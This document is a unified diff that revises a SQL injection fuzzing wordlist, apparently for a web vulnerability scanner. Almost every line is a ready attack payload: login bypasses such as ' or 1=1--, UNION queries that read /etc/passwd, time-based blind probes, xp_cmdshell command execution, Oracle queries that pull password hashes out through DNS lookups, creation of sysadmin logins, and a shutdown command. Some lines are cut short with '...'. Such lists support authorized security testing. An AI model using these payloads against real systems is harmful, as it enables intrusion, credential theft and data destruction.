@@ -1,10 +1,11 @@
+ --
 !
 "
 #
 &
 '
-'--
-';
+' --
+' ;
 (
 )
 */*
@@ -16,254 +17,313 @@
 //
 //*
 <>"'%;)(&+
-='
-=--
-=;
+= '
+= --
+= ;
 ?
-@
 |
 0
-031003000270000
-0or1=1
-0x730065006c00650063007400200040004000760065007200730069006f006e00exec(@q)
-0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A
-0x77616974666F722064656C61792027303A303A31302700exec(@s)
-1
-1'1
-1\'1
-1and1=1
-1'and1=(selectcount(*)fromtablenames);--
-1andascii(lower(substring((selecttop1namefromsysobjectswherextype='u'),1,1)))>116
-1'andnon_existant_table='1
-1anduser_name()='dbo'
-1execsp_(orexecxp_)
-1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;
+0 or 1=1
+0x730065006c0065006300740020004000400076006500 ...
+0x770061006900740066006F0072002000640065006C00 ...
+0x77616974666F722064656C61792027303A303A313027 ...
+1;(load_file(char(47,101,116,99,47,112,97,115, ...
+1 or 1=1
 1'or'1'='1
-1or1=1
+1 or '1'='1'=1
+1 or '1'='1' or 1=1
+1 or benchmark(10000000,MD5(1))#
+1) or benchmark(10000000,MD5(1))#
+1)) or benchmark(10000000,MD5(1))#
+1 or pg_sleep(__TIME__)--
+1) or pg_sleep(__TIME__)--
+1)) or pg_sleep(__TIME__)--
+1 or sleep(__TIME__)#
+1) or sleep(__TIME__)#
+1)) or sleep(__TIME__)#
 1;SELECT%20*
-1unionallselect1,2,3,4,5,6,namefromsysobjectswherextype='u'--
-1uni/**/onselectallfromwhere
-1waitfordelay'0:0:10'--
+1 waitfor delay '0:0:10'--
 %20$(sleep%2050)
+%20or%20''='
 '%20or%20''='
+%20or%201=1
 '%20or%201=1
+%20or%20'x'='x
 %20or%20x=x
 '%20or%20'x'='x
 ')%20or%20('x'='x
+)%20or%20('x'='x
 %20'sleep%2050'
 %21
-23or1=1;--
-23OR1=1
+21 %
+23 OR 1=1
 %26
+26 %
 %27%20or%201=1
 %28
+28 %
 %29
+29 %
 %2A%28%7C%28mail%3D%2A%29%29
 %2A%28%7C%28objectclass%3D%2A%29%29
 %2A%7C
-'||'6
+3.10E+17
 (||6)
+||'6
 ||6
 %7C
-a
 a'
-a'--
+Ã½ or 1=1 --
 admin'--
-admin'or'
-'and1=0)unionall
-)and(1=1
-'and1=(if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));
-'and1in(selectvarfromtemp)--
-'AND1=utl_inaddr.get_host_address((SELECTbannerFROMv$versionWHEREROWNUM=1))AND'i'='i
-'AND1=utl_inaddr.get_host_address((SELECTDISTINCT(column_name)FROM(SELECTDISTINCT(column_name),ROWNUMASLIMITFROMall_tab_columns)WHERELIMIT=1))AND'i'='i
-'AND1=utl_inaddr.get_host_address((SELECTDISTINCT(granted_role)FROM(SELECTDISTINCT(granted_role),ROWNUMASLIMITFROMdba_role_privsWHEREGRANTEE=SYS.LOGINUSER)WHERELIMIT=1))AND'i'='i
-'AND1=utl_inaddr.get_host_address((SELECTDISTINCT(PASSWORD)FROM(SELECTDISTINCT(PASSWORD),ROWNUMASLIMITFROMSYS.USER$)WHERELIMIT=1))AND'i'='i
-'AND1=utl_inaddr.get_host_address((SELECTglobal_nameFROMglobal_name))AND'i'='i
-'AND1=utl_inaddr.get_host_address((SELECThost_nameFROMv$instance))AND'i'='i
-'AND1=utl_inaddr.get_host_address((SELECTSYS.DATABASE_NAMEFROMDUAL))AND'i'='i
-'AND1=utl_inaddr.get_host_address((SELECTSYS.LOGIN_USERFROMDUAL))AND'i'='i
-'and2>1--
-'and2>3--
-'and''like'
-'and''like'%
-'and''like''--
-'aND''like'%
-'AnD''like'
-')and('x'='x
-anything'or'x'='x
-anything'OR'x'='x
-"a""or1=1--"
-a'or1=1--
-a'or1=1;--
-"a""or3=3--"
-a'or3=3--
-a'or'a'='a
+admin' or '
+) and (1=1
+ and 1=( if((load_file(char(110,46,101,120,11 ...
+ and 1 in (select var from temp)--
+' and 2>1--
+' and 2>3--
+' and '' like '
+' and '' like '%
+' and '' like ''--
+' aND '' like '%
+' AnD '' like '
+') and ('x'='x
+anything' OR 'x'='x
+"a"" or 1=1--"
+a' or 1=1--
+a'or' 1=1--
+â or 1=1 --
+"a"" or 3=3--"
+a' or 3=3--
+â or 3=3 --
+a' or 'a' = 'a
 &apos;%20OR
 as
 asc
-a'waitfordelay'0:0:10'--
-';begindeclare@varvarchar(8000)set@var=':'select@var=@var+'+login+'/'+password+''fromuserswherelogin>
+a' waitfor delay '0:0:10'--
+; begin declare @var varchar(8000) set @var=' ...
+benchmark(10000000,MD5(1))#
 bfilename
 char%4039%41%2b%40SELECT
-createusernameidentifiedby'pass123'
-createusernameidentifiedbypass123temporarytablespacetempdefaulttablespaceusers;
-declare@qnvarchar(200)0x730065006c00650063007400200040004000760065007200730069006f006e00exec(@q)
-declare@qnvarchar(4000)select@q=
-declare@svarchar(200)select@s=0x73656c65637420404076657273696f6eexec(@s)
-declare@svarchar(200)select@s=0x77616974666F722064656C61792027303A303A31302700exec(@s)
-declare@svarchar(22)select@s=
-declare@svarchar(8000)select@s=0x73656c65637420404076657273696f6e
+declare @q nvarchar (200) 0x730065006c00650063 ...
+declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
+declare @q nvarchar (200) select @q = 0x770061 ...
+declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)
+declare @q nvarchar (4000) select @q =
+declare @s varchar (200) select @s = 0x73656c6 ...
+declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
+declare @s varchar(200) select @s = 0x77616974 ...
+declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s)
+declare @s varchar(22) select @s =
+declare @s varchar (8000) select @s = 0x73656c ...
 delete
 desc
-\';descusers;--
 distinct
-';droptabletemp--
-'||(elt(-3+5,bin(15),ord(10),hex(char(45))))
-';execmaster..xp_cmdshell
-';execmaster..xp_cmdshell'ping10.10.1.2'--
-';execmaster..xp_cmdshell'ping172.10.1.255'--
+||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+'; exec master..xp_cmdshell
+; exec master..xp_cmdshell
+'; exec master..xp_cmdshell 'ping 172.10.1.255'--
+; exec master..xp_cmdshell 'ping 172.10.1.255'--
 exec(@s)
-';exec('sel'+'ectus'+'er')
-execsp
-execsp_addlogin'name','password'
-execsp_addsrvrolemember'name','sysadmin'
-';executeimmediate'sel'||'ectus'||'er'
-execxp
-';execxp_regread
-grantconnecttoname;grantresourcetoname;
-'groupbyuseridhaving1=1--
+; exec ('sel' + 'ect us' + 'er')
+exec sp
+; execute immediate 'sel' || 'ect us' || 'er'
+exec xp
+'; exec xp_regread
+; exec xp_regread
+# from wapiti
+ group by userid having 1=1--
 handler
 having
-'having1=1--
-hi"or1=1--
-hi'or1=1--
-hior1=1--"
-"hi"")or(""a""=""a"
-hi")or("a"="a
-hi"or"a"="a
-hi')or('a'='a
-hi'or'a'='a
-hiora=a
-'hi'or'x'='x';
-';ifis_srvrolemember('sysadmin')>0waitfordelay'0:0:2'--
-';ifnot((selectserverproperty('isintegratedsecurityonly'))<>0)waitfordelay'0:0:2'--
-';ifnot((selectserverproperty('isintegratedsecurityonly'))<>1)waitfordelay'0:0:2'--
-';ifnot(selectsystem_user)<>'sa'waitfordelay'0:0:2'--
-';ifnot(substring((select@@version),24,1)<>1)waitfordelay'0:0:2'--
+ having 1=1--
+hi or 1=1 --"
+hi" or 1=1 --
+hi' or 1=1 --
+"hi"") or (""a""=""a"
+hi or a=a
+hi" or "a"="a
+hi") or ("a"="a
+hi' or 'a'='a
+hi') or ('a'='a
+'hi' or 'x'='x';
+hi' or 'x'='x';
 insert
-insertintomysql.user(user,host,password)values('name','localhost',password('pass123'))
-insertintousers(login,password,level)values(char(0x70)+char(0x65)+char(0x74)+char(0x65)+char(0x72)+char(0x70)+char(0x65)+char(0x74)+char(0x65)+char(0x72),char(0x64)
 like
 limit
 &lt;&gt;&quot;'%;)(&amp;+
 *(|(mail=*))
-'||myappadmin.adduser('admin','newpass')||'
 *(|(objectclass=*))
+ or ''='
+' or ''='
 'or''='
 or
-"or0=0#
-"or0=0--
-'or0=0#
-'or0=0--
-or0=0#
-or0=0#"
-or0=0--
-"'or1--'"
-'or1--'
-'or1/*
-"or1=1--
-'/**/or/**/1/**/=/**/1
-'or'1'='1
-'or'1'='1'--
-'or1=1
-'or1=1--
-'or1=1/*
-;or'1'='1'
-?or1=1--
-‘or1=1--
-’or‘1’=’1
-or1=1
-or1=1--
-"or1=1or""="
-'or1=1or''='
-or1=1or""=
-'or1in(select@@version)--
+ or 0=0 #
+ or 0=0 #"
+ or 0=0 --
+" or 0=0 #
+" or 0=0 --
+' or 0=0 #
+' or 0=0 --
+or 0=0 #
+or 0=0 #"
+or 0=0 --
+ or 1 --'
+ or 1/*
+"' or 1 --'"
+' or 1 --'
+ or 1=1 --
+ or '1'='1
+ or '1'='1'--
+ or 1=1
+ or 1=1 /*
+ or 1=1--
+" or 1=1--
+"or 1=1
+"or 1=1--
+' or '1'='1'--
+' or 1=1
+' or 1=1--
+'or 1=1--
+'or 1=1/*
+/**/or/**/1/**/=/**/1
+; or '1'='1'
+¡® or 1=1 --
+or 1=1
+or 1=1--
+'OR 1=1
+ or 1=1 or ""=
+ or 1=1 or ''='
+" or 1=1 or ""="
+' or 1=1 or ''='
+or 1=1 or ""=
+ or 1 in (select @@version)--
 or%201=1
-or%201=1--
-'or2>1
-'or2between1and3
-'or3=3
-‘or3=3--
-'or'7659'='7659
-")or("a"="a
-"or"a"="a
+or%201=1 --
+ or 2 > 1
+ or 2 between 1 and 3
+ or 3=3 --
+ or 3=3
+' or 3=3
+¡® or 3=3 --
+ or '7659'='7659
+ or 'a'='a
+ or a = a
+ or a=a
+ or a=a--
+" or "a"="a
+") or ("a"="a
+"or "a"="a
+"or"="a'='a
+' or a=a--
+') or ('a'='a
 ')or('a'='a
 'or'a'='a
-'ora=a--
-)or(a=a
-ora=a
-orderby
-'or(EXISTS)
-"orisNULL(1/0)/*
-orisNULL(1/0)/*
-'or''like'
+) or ('a'='a
+) or (a=a
+or a = a
+or a=a
+ or benchmark(10000000,MD5(1))#
+" or benchmark(10000000,MD5(1))#
+") or benchmark(10000000,MD5(1))#
+")) or benchmark(10000000,MD5(1))#
+) or benchmark(10000000,MD5(1))#
+)) or benchmark(10000000,MD5(1))#
+order by
+ or (EXISTS)
+' or (EXISTS)
+" or isNULL(1/0) /*
+or isNULL(1/0) /*
+' or '' like '
 'or'='or'
-'orselect*
-'or'something'like'some%'
-'or'something'='some'+'thing'
-'or'text'=n'text'
-'or'text'>'t'
-'oruidlike'%
-'orunamelike'%
-'or'unusual'='unusual'
-'oruseridlike'%
-'oruserlike'%
-'orusernameisnotNULLorusername='
-'orusernamelike'%
-'orusernamelikechar(37);
-'or'whatever'in('whatever')
-"or"x"="x
-')or('x'='x
-'or'x'='x
-'--&password=
+ or pg_sleep(__TIME__)--
+" or pg_sleep(__TIME__)--
+") or pg_sleep(__TIME__)--
+")) or pg_sleep(__TIME__)--
+) or pg_sleep(__TIME__)--
+)) or pg_sleep(__TIME__)--
+'or select *
+ or sleep(__TIME__)#
+ or sleep(__TIME__)='
+" or sleep(__TIME__)#
+") or sleep(__TIME__)="
+")) or sleep(__TIME__)="
+) or sleep(__TIME__)='
+)) or sleep(__TIME__)='
+ or 'something' = 'some'+'thing'
+ or 'text' = n'text'
+ or 'text' > 't'
+' or uid like '%
+' or uname like '%
+ or 'unusual' = 'unusual'
+' or userid like '%
+' or user like '%
+' or username like '%
+ or username like char(37);
+ or 'whatever' in ('whatever')
+" or "x"="x
+' or 'x'='x
+') or ('x'='x
+ -- &password=
 password:*/=1--
+pg_sleep(__TIME__)--
 PRINT
-PRINT@@variable
+PRINT @@variable
 procedure
 replace
 select
-'select*frominformation_schema.tables--
-'selectnamefromsyscolumnswhereid=(selectidfromsysobjectswherename=tablename')--
-'(selecttop1
+ select * from information_schema.tables--
+ select name from syscolumns where id = (sele ...
+ (select top 1
+' (select top 1
 ';shutdown--
 --sp_password
 'sqlattempt1
 (sqlattempt2)
-'+sqlvuln
-'sqlvuln
 (sqlvuln)
++sqlvuln
+sqlvuln
 sqlvuln;
-t'execmaster..xp_cmdshell'nslookupwww.google.com'--
+t'exec master..xp_cmdshell 'nslookup www.googl ...
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
 to_timestamp_tz
 truncate
 tz_offset
-'UNIONALLSELECT
-'unionallselect@@version--
-'unionselect
-uni/**/onsel/**/ect
-'UNIONSELECT
-'unionselect1,load_file('/etc/passwd'),1,1,1;
-)unionselect*frominformation_schema.tables;
-'unionselect*fromuserswherelogin=char(114,111,111,116);
-'union(selectNULL,NULL,NULL,NULL,NULL,(select@@version))--
-'union(selectNULL,NULL,NULL,NULL,(select@@version))--
-'union(selectNULL,NULL,NULL,(select@@version))--
-'union(selectNULL,NULL,(select@@version))--
-'union(selectNULL,(select@@version))--
-'union(select@@version)--
+ UNION ALL SELECT
+' UNION ALL SELECT
+ union all select @@version--
+ union select
+uni/**/on sel/**/ect
+ UNION SELECT
+' UNION SELECT
+ union select 1,load_file('/etc/passwd'),1,1,1;
+) union select * from information_schema.tables;
+ union select * from users where login = char ...
 update
 '||UTL_HTTP.REQUEST
-'||utl_http.request('httP://192.168.1.1/')||'
+||UTL_HTTP.REQUEST
 ,@variable
 @variable
-@varselect@varasvarintotempend--
+@var select @var as var into temp end --
+"));waitfor delay '0:0:__TIME__'--
+");waitfor delay '0:0:__TIME__'--
+";waitfor delay '0:0:__TIME__'--
+));waitfor delay '0:0:__TIME__'--
+);waitfor delay '0:0:__TIME__'--
+;waitfor delay '0:0:__TIME__'--
+\x23
+\x27
+\x27UNION SELECT
+\x27\x4F\x52 SELECT *
+\x27\x6F\x72 SELECT *
+\x3D \x27
+\x3D \x3B'
+x' AND 1=(SELECT COUNT(*) FROM tabname); --
+x' AND email IS NULL; --
+x' AND members.email IS NULL; --
+x' AND userid IS NULL; --
+'xor
+x' or 1=1 or 'x'='y
+x' OR full_name LIKE '%Bob%
+ý or 1=1 --
+ý or 3=3 --
+�� or 1=1 --
+�� or 3=3 --
